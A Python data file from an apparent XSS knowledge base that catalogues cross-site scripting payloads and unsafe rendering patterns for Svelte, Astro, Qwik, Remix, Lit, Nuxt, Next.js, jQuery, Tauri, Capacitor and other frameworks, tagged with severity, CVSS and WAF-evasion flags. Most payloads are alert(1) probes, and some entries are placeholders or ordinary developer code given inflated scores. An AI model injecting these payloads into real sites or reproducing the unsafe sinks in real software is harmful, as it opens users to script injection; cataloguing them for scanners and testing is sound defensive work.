#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Modern JavaScript Frameworks XSS Payloads
Covers: Svelte, SvelteKit, Astro, Qwik, Remix, SolidJS, Lit, Preact, Nuxt, Next.js, Ember, Backbone
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Svelte Payloads ===
SVELTE_PAYLOADS = {
    "svelte-html-directive": PayloadEntry(
        payload='{@html "<img src=x onerror=alert(1)>"}',
        contexts=["svelte", "html_content", "template"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Svelte @html directive for raw HTML injection",
        tags=["svelte", "framework", "@html", "directive"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "svelte-bind-innerHTML": PayloadEntry(
        payload="<div bind:innerHTML={xss}></div>",
        contexts=["svelte", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Svelte bind:innerHTML for DOM injection",
        tags=["svelte", "framework", "bind", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "svelte-on-event": PayloadEntry(
        payload="<button on:click={() => alert(1)}>Click</button>",
        contexts=["svelte", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Svelte on:click event handler",
        tags=["svelte", "framework", "event", "on:click"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "svelte-action": PayloadEntry(
        payload="<div use:action={(node) => { alert(1) }}></div>",
        contexts=["svelte", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Svelte action directive for code execution",
        tags=["svelte", "framework", "action", "use"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === SvelteKit Payloads ===
SVELTEKIT_PAYLOADS = {
    "sveltekit-load-function": PayloadEntry(
        payload='export async function load() { return { xss: "<script>alert(1)</script>" } }',
        contexts=["sveltekit", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SvelteKit load function data injection",
        tags=["sveltekit", "framework", "load", "ssr"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "sveltekit-form-action": PayloadEntry(
        payload='<form method="POST" action="?/xss"><input name="payload" value="<script>alert(1)</script>"></form>',
        contexts=["sveltekit", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SvelteKit form action injection",
        tags=["sveltekit", "framework", "form", "action"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "sveltekit-page-data": PayloadEntry(
        payload='<script>const data = {"xss":"<img src=x onerror=alert(1)>"};</script>',
        contexts=["sveltekit", "javascript", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SvelteKit page data JSON injection",
        tags=["sveltekit", "framework", "data", "json"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Astro Payloads ===
ASTRO_PAYLOADS = {
    "astro-set-html": PayloadEntry(
        payload="<div set:html={userInput}></div>",
        contexts=["astro", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Astro set:html directive for raw HTML",
        tags=["astro", "framework", "set:html", "directive"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "astro-client-directive": PayloadEntry(
        payload="<Component client:load onMount={() => alert(1)} />",
        contexts=["astro", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Astro client directive with event handler",
        tags=["astro", "framework", "client", "directive"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "astro-script-inline": PayloadEntry(
        payload="<script is:inline>alert(1)</script>",
        contexts=["astro", "html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="Astro inline script execution",
        tags=["astro", "framework", "script", "inline"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "astro-define-vars": PayloadEntry(
        payload='<script define:vars={{ xss: "<script>alert(1)</script>" }}></script>',
        contexts=["astro", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Astro define:vars injection",
        tags=["astro", "framework", "define", "vars"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Qwik Payloads ===
QWIK_PAYLOADS = {
    "qwik-dangerouslySetInnerHTML": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={userInput}></div>",
        contexts=["qwik", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Qwik dangerouslySetInnerHTML injection",
        tags=["qwik", "framework", "innerHTML", "dangerous"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "qwik-dollar-handler": PayloadEntry(
        payload="<button onClick$={() => alert(1)}>Click</button>",
        contexts=["qwik", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Qwik $ suffix event handler",
        tags=["qwik", "framework", "event", "dollar"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "qwik-useVisibleTask": PayloadEntry(
        payload="useVisibleTask$(() => { alert(1) })",
        contexts=["qwik", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Qwik useVisibleTask for client-side execution",
        tags=["qwik", "framework", "task", "visible"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Remix Payloads ===
REMIX_PAYLOADS = {
    "remix-loader-injection": PayloadEntry(
        payload='export async function loader() { return json({ xss: "<script>alert(1)</script>" }) }',
        contexts=["remix", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Remix loader function data injection",
        tags=["remix", "framework", "loader", "json"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "remix-action-injection": PayloadEntry(
        payload="export async function action({ request }) { /* XSS in response */ }",
        contexts=["remix", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Remix action function injection",
        tags=["remix", "framework", "action", "form"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "remix-dangerouslySetInnerHTML": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={{ __html: userInput }}></div>",
        contexts=["remix", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Remix dangerouslySetInnerHTML in JSX",
        tags=["remix", "framework", "innerHTML", "jsx"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === SolidJS Payloads ===
SOLIDJS_PAYLOADS = {
    "solidjs-innerHTML": PayloadEntry(
        payload="<div innerHTML={userInput}></div>",
        contexts=["solidjs", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="SolidJS innerHTML prop injection",
        tags=["solidjs", "framework", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "solidjs-event": PayloadEntry(
        payload="<button onClick={() => alert(1)}>Click</button>",
        contexts=["solidjs", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SolidJS onClick event handler",
        tags=["solidjs", "framework", "event", "onClick"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "solidjs-ref-callback": PayloadEntry(
        payload='<div ref={(el) => { el.innerHTML = "<img src=x onerror=alert(1)>" }}></div>',
        contexts=["solidjs", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SolidJS ref callback DOM manipulation",
        tags=["solidjs", "framework", "ref", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Lit Element Payloads ===
LIT_PAYLOADS = {
    "lit-unsafeHTML": PayloadEntry(
        payload="html`${unsafeHTML(userInput)}`",
        contexts=["lit", "lit_element", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Lit unsafeHTML directive for raw HTML",
        tags=["lit", "framework", "unsafeHTML", "directive"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "lit-unsafeSVG": PayloadEntry(
        payload="svg`${unsafeSVG(userInput)}`",
        contexts=["lit", "lit_element", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Lit unsafeSVG directive for SVG injection",
        tags=["lit", "framework", "unsafeSVG", "svg"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "lit-event-listener": PayloadEntry(
        payload="html`<button @click=${() => alert(1)}>Click</button>`",
        contexts=["lit", "lit_element", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Lit @click event listener",
        tags=["lit", "framework", "event", "@click"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Preact Payloads ===
PREACT_PAYLOADS = {
    "preact-dangerouslySetInnerHTML": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={{ __html: userInput }}></div>",
        contexts=["preact", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Preact dangerouslySetInnerHTML injection",
        tags=["preact", "framework", "innerHTML", "dangerous"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "preact-ref-callback": PayloadEntry(
        payload='<div ref={(el) => { if(el) el.innerHTML = "<img src=x onerror=alert(1)>" }}></div>',
        contexts=["preact", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Preact ref callback DOM manipulation",
        tags=["preact", "framework", "ref", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Nuxt Payloads ===
NUXT_PAYLOADS = {
    "nuxt-v-html": PayloadEntry(
        payload='<div v-html="userInput"></div>',
        contexts=["nuxt", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Nuxt v-html directive (Vue-based)",
        tags=["nuxt", "vue", "framework", "v-html"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "nuxt-useFetch-injection": PayloadEntry(
        payload="const { data } = await useFetch('/api/xss')",
        contexts=["nuxt", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Nuxt useFetch data injection",
        tags=["nuxt", "framework", "fetch", "composable"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Next.js App Router Payloads ===
NEXTJS_APPROUTER_PAYLOADS = {
    "nextjs-approuter-dangerouslySetInnerHTML": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={{ __html: userInput }}></div>",
        contexts=["nextjs", "nextjs_approuter", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Next.js App Router dangerouslySetInnerHTML",
        tags=["nextjs", "approuter", "framework", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "nextjs-server-component-injection": PayloadEntry(
        payload="export default async function Page() { const data = await fetch(...); /* XSS */ }",
        contexts=["nextjs", "nextjs_approuter", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Next.js Server Component data injection",
        tags=["nextjs", "approuter", "server", "component"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Ember Payloads ===
EMBER_PAYLOADS = {
    "ember-triple-curlies": PayloadEntry(
        payload="{{{userInput}}}",
        contexts=["ember", "html_content", "template"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Ember triple curly braces for unescaped HTML",
        tags=["ember", "framework", "handlebars", "triple"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "ember-htmlSafe": PayloadEntry(
        payload="{{htmlSafe userInput}}",
        contexts=["ember", "html_content", "template"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Ember htmlSafe helper for raw HTML",
        tags=["ember", "framework", "htmlSafe", "helper"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "ember-action": PayloadEntry(
        payload='<button {{action "xss"}}>Click</button>',
        contexts=["ember", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Ember action helper",
        tags=["ember", "framework", "action", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Backbone Payloads ===
BACKBONE_PAYLOADS = {
    "backbone-el-html": PayloadEntry(
        payload="this.$el.html(userInput)",
        contexts=["backbone", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Backbone.js $el.html() injection",
        tags=["backbone", "framework", "jquery", "html"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "backbone-template": PayloadEntry(
        payload='_.template("<div><%= userInput %></div>")',
        contexts=["backbone", "javascript", "template"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Backbone underscore template injection",
        tags=["backbone", "framework", "underscore", "template"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === jQuery Payloads ===
JQUERY_PAYLOADS = {
    "jquery-html": PayloadEntry(
        payload='$("div").html(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery .html() method injection",
        tags=["jquery", "library", "html", "method"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-append": PayloadEntry(
        payload='$("div").append(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery .append() method injection",
        tags=["jquery", "library", "append", "method"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-selector-xss": PayloadEntry(
        payload="$('<img src=x onerror=alert(1)>')",
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery selector HTML creation",
        tags=["jquery", "library", "selector", "creation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-attr-href": PayloadEntry(
        payload='$("a").attr("href", "javascript:alert(1)")',
        contexts=["jquery", "javascript", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="jQuery .attr() href injection",
        tags=["jquery", "library", "attr", "href"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Tauri Payloads ===
TAURI_PAYLOADS = {
    "tauri-invoke": PayloadEntry(
        payload='await invoke("run_command", { cmd: userInput })',
        contexts=["tauri", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Tauri invoke with command injection (RCE)",
        tags=["tauri", "desktop", "invoke", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "tauri-shell-open": PayloadEntry(
        payload="await open(userInput)",
        contexts=["tauri", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Tauri shell open for URL/file access",
        tags=["tauri", "desktop", "shell", "open"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Capacitor Payloads ===
CAPACITOR_PAYLOADS = {
    "capacitor-browser-open": PayloadEntry(
        payload='await Browser.open({ url: "javascript:alert(1)" })',
        contexts=["capacitor", "javascript", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Capacitor Browser plugin JavaScript URL",
        tags=["capacitor", "mobile", "browser", "plugin"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "capacitor-filesystem": PayloadEntry(
        payload='await Filesystem.writeFile({ path: userInput, data: "..." })',
        contexts=["capacitor", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Capacitor Filesystem path traversal",
        tags=["capacitor", "mobile", "filesystem", "plugin"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# Combined database
MODERN_FRAMEWORKS_PAYLOADS = {
    **SVELTE_PAYLOADS,
    **SVELTEKIT_PAYLOADS,
    **ASTRO_PAYLOADS,
    **QWIK_PAYLOADS,
    **REMIX_PAYLOADS,
    **SOLIDJS_PAYLOADS,
    **LIT_PAYLOADS,
    **PREACT_PAYLOADS,
    **NUXT_PAYLOADS,
    **NEXTJS_APPROUTER_PAYLOADS,
    **EMBER_PAYLOADS,
    **BACKBONE_PAYLOADS,
    **JQUERY_PAYLOADS,
    **TAURI_PAYLOADS,
    **CAPACITOR_PAYLOADS,
}

MODERN_FRAMEWORKS_TOTAL = len(MODERN_FRAMEWORKS_PAYLOADS)
